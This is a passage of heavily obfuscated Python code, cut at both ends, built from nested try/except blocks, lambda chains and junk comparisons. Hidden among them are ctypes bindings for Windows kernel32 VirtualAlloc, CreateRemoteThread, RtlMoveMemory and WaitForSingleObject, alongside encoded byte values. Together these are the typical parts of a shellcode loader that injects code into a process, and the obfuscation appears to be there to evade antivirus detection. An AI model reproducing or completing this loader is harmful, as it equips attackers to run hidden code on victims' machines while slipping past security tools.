        raise MemoryError([(lambda : (lambda _111: _111 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1917:
        __8192010993867 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1610' == '92':
        case True:
            raise MemoryError([True])
        case False:
            _712 = [[True], [False]]
            R_E_D__A_V______(['_1514'])
    raise MemoryError([True])
except MemoryError as _917:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _197: _197 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1113 = [[(lambda : (lambda _73: _73 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _161: _161 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742706, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _1410: _1410 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _53:
        try:
            raise MemoryError(__8192010993867)
        except MemoryError as __5242296362825:
            if __5242296362825.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.restype = wt.LPVOID
            if __5242296362825.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __5184146967187 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x12\xbb\x132,\x9c'))()
            if __5242296362825.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __4117972998528 = (lambda : R_E_D__A_V(b'R_E_D__A_V__W79\xe9.E'))()
            if __5242296362825.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __3393248530600 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xd4\x99+\x8ei|'))()
try:
    match '1813' == '95':
        case True:
            raise MemoryError([True])
        case False:
            _1916 = [[True], [False]]
            R_E_D__A_V______(['_38'])
    raise MemoryError([True])
except MemoryError as _615:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _46: _46 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _817 = [[(lambda : (lambda _61: _61 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _49: _49 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _1612: _1612 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _19:
        __8113485048877 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '514' == '216':
        case True:
            raise MemoryError([True])
        case False:
            _1617 = [[True], [False]]
            R_E_D__A_V______(['_917'])
    raise MemoryError([True])
except MemoryError as _93:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _716: _716 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _129 = [[(lambda : (lambda _141: _141 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _419: _419 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _813: _813 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _101:
        __8113485048877 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '38' == '98':
        case True:
            raise MemoryError([True])
        case False:
            _64 = [[True], [False]]
            R_E_D__A_V______(['_109'])
    raise MemoryError([True])
except MemoryError as _1810:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _814: _814 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1519 = [[(lambda : (lambda _67: _67 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _58: _58 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _112: _112 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _617:
        try:
            raise MemoryError(__8113485048877)
        except MemoryError as __2900163563960:
            if __2900163563960.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
            if __2900163563960.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __2172261088092 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xeb\xc3\x94xa\x8c'))()
            if __2900163563960.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __6252414429633 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xe4\x14s\x1c\x14b'))()
try:
    match '39' == '65':
        case True:
            raise MemoryError([True])
        case False:
            _616 = [[True], [False]]
            R_E_D__A_V______(['_218'])
    raise MemoryError([True])
except MemoryError as _176:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _112: _112 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1417 = [[(lambda : (lambda _1417: _1417 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1415: _1415 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _911: _911 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _45:
        __8545064631046 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1917' == '616':
        case True:
            raise MemoryError([True])
        case False:
            _73 = [[True], [False]]
            R_E_D__A_V______(['_1317'])
    raise MemoryError([True])
except MemoryError as _149:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _87: _87 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1712 = [[(lambda : (lambda _1912: _1912 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1117: _1117 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _161: _161 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1017:
        __8545064631046 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '112' == '411':
        case True:
            raise MemoryError([True])
        case False:
            _512 = [[True], [False]]
            R_E_D__A_V______(['_145'])
    raise MemoryError([True])
except MemoryError as _719:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _172: _172 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1418 = [[(lambda : (lambda _1719: _1719 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _911: _911 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _1015: _1015 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _51:
        try:
            raise MemoryError(__8545064631046)
        except MemoryError as __5728221223905:
            if __5728221223905.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.restype = wt.HANDLE
            if __5728221223905.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __2075395617793 = (lambda : R_E_D__A_V(b'R_E_D__A_V__=\r\x18}\x8e\x88'))()
try:
    match '515' == '74':
        case True:
            raise MemoryError([True])
        case False:
            _179 = [[True], [False]]
            R_E_D__A_V______(['_118'])
    raise MemoryError([True])
except MemoryError as _1117:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _148: _148 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _210 = [[(lambda : (lambda _1119: _1119 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1517: _1517 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742712, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _78: _78 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1614:
        __3999783990957 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '65' == '811':
        case True:
            raise MemoryError([True])
        case False:
            _113 = [[True], [False]]
            R_E_D__A_V______(['_1713'])
    raise MemoryError([True])
except MemoryError as _126:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _313: _313 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _212 = [[(lambda : (lambda _810: _810 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _916: _916 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _1812: _1812 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _124:
        __3999783990957 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '410' == '717':
        case True:
            raise MemoryError([True])
        case False:
            _111 = [[True], [False]]
            R_E_D__A_V______(['_112'])
    raise MemoryError([True])
except MemoryError as _85:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _717: _717 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _417 = [[(lambda : (lambda _1316: _1316 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1113: _1113 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742712, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _811: _811 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _710:
        try:
            raise MemoryError(__3999783990957)
        except MemoryError as __5387133922263:
            if __5387133922263.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
            if __5387133922263.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __8312400736680 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xac\xe6{\x1e\x04\x0b'))()
            if __5387133922263.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __7490662980695 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x8a\x19\x84\x12\xc4\x0b'))()
try:
    match '319' == '78':
        case True:
            raise MemoryError([True])
        case False:
            _1315 = [[True], [False]]
            R_E_D__A_V______(['_1015'])
    raise MemoryError([True])
except MemoryError as _1519:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1217: _1217 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _184 = [[(lambda : (lambda _619: _619 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _163: _163 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742712, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _1118: _1118 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1110:
        __2876553739843 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '314' == '72':
        case True:
            raise MemoryError([True])
        case False:
            _153 = [[True], [False]]
            R_E_D__A_V______(['_161'])
    raise MemoryError([True])
except MemoryError as _164:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _65: _65 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1110 = [[(lambda : (lambda _146: _146 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1419: _1419 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _26: _26 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1417:
        __2876553739843 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1613' == '1418':
        case True:
            raise MemoryError([True])
        case False:
            _35 = [[True], [False]]
            R_E_D__A_V______(['_117'])
    raise MemoryError([True])
except MemoryError as _1314:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1114: _1114 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _916 = [[(lambda : (lambda _112: _112 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1916: _1916 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _139: _139 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1311:
        try:
            raise MemoryError(__2876553739843)
        except MemoryError as __2117640775732:
            if __2117640775732.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.restype = None
            if __2117640775732.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3986111071864 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xd8\xc3\x96!\xe1a'))()
            if __2117640775732.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __3035550948139 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xa3\x07\xe1\x90\xdd\xf3'))()
            if __2117640775732.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __2938660226132 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xf5^\x91=j-'))()
            if __2117640775732.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __3502697295912 = (lambda : R_E_D__A_V(b'R_E_D__A_V__d\xeb\xd4g\xe3,'))()
try:
    match '1118' == '1213':
        case True:
            raise MemoryError([True])
        case False:
            _219 = [[True], [False]]
            R_E_D__A_V______(['_1612'])
    raise MemoryError([True])
except MemoryError as _517:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _161: _161 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _213 = [[(lambda : (lambda _141: _141 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1210: _1210 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742712, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _311: _311 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _161:
        __7598499196768 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '178' == '195':
        case True:
            raise MemoryError([True])
        case False:
            _413 = [[True], [False]]
            R_E_D__A_V______(['_1819'])
    raise MemoryError([True])
except MemoryError as _186:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _167: _167 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _310 = [[(lambda : (lambda _1610: _1610 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _141: _141 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _24: _24 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _126:
        __7598499196768 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '126' == '1216':
        case True:
            raise MemoryError([True])
        case False:
            _65 = [[True], [False]]
            R_E_D__A_V______(['_515'])
    raise MemoryError([True])
except MemoryError as _85:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _619: _619 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _43 = [[(lambda : (lambda _12: _12 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1715: _1715 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _14: _14 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _12:
        try:
            raise MemoryError(__7598499196768)
        except MemoryError as __3305344862817:
            if __3305344862817.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
            if __3305344862817.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3720179920155 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x8b\x1e2*Dp'))()
            if __3305344862817.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __8307885237315 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xcb\xf1\x9a\x8a\xe3\xfc'))()
            if __3305344862817.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __3915309912131 = (lambda : R_E_D__A_V(b'R_E_D__A_V__^\x1at\xdfR6'))()
            if __3305344862817.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __8498966576714 = (lambda : R_E_D__A_V(b'R_E_D__A_V__A\xf2?\x96jv'))()
try:
    match '81' == '1018':
        case True:
            raise MemoryError([True])
        case False:
            _95 = [[True], [False]]
            R_E_D__A_V______(['_1615'])
    raise MemoryError([True])
except MemoryError as _310:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _419: _419 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _196 = [[(lambda : (lambda _105: _105 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _131: _131 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _219: _219 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _714:
        __5963620520738 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '48' == '315':
        case True:
            raise MemoryError([True])
        case False:
            _519 = [[True], [False]]
            R_E_D__A_V______(['_98'])
    raise MemoryError([True])
except MemoryError as _512:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _134: _134 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1817 = [[(lambda : (lambda _1114: _1114 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _52: _52 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _414: _414 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _145:
        __5963620520738 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '911' == '518':
        case True:
            raise MemoryError([True])
        case False:
            _153 = [[True], [False]]
            R_E_D__A_V______(['_153'])
    raise MemoryError([True])
except MemoryError as _25:
    try:
